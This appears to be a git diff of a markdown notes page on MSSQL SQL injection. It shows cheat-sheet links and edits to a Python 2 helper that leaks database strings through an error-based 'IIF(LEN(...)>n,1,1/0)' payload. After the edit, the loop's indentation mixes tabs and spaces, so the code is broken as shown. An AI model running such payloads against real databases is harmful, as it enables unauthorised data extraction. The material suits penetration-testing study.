@@ -4,7 +4,7 @@
 
 * [https://www.perspectiverisk.com/mssql-practical-injection-cheat-sheet/](https://www.perspectiverisk.com/mssql-practical-injection-cheat-sheet/)
 * [http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
-* 
+
 ## Error Based SQL Injection
 
 [https://www.exploit-db.com/docs/english/44348-error-based-sql-injection-in-order-by-clause-\(mssql\).pdf](https://www.exploit-db.com/docs/english/44348-error-based-sql-injection-in-order-by-clause-%28mssql%29.pdf)
@@ -40,12 +40,11 @@ def binary_search(payload):
 			return 0
 
 def leak_string(query, length=0):
-	if length == 0:
-		while True:
-			payload = 'IIF(LEN({0})>{1},1,1/0)'.format(query, length)
-                	if exploit(payload) == False:
-                        	break
-                	length += 1
+	while True:
+		payload = 'IIF(LEN({0})>{1},1,1/0)'.format(query, length)
+        if exploit(payload) == False:
+        	break
+        length += 1
 	print '[+] Length of {0}'.format(length)
 	name = ''
 	for i in range(1, length+1):
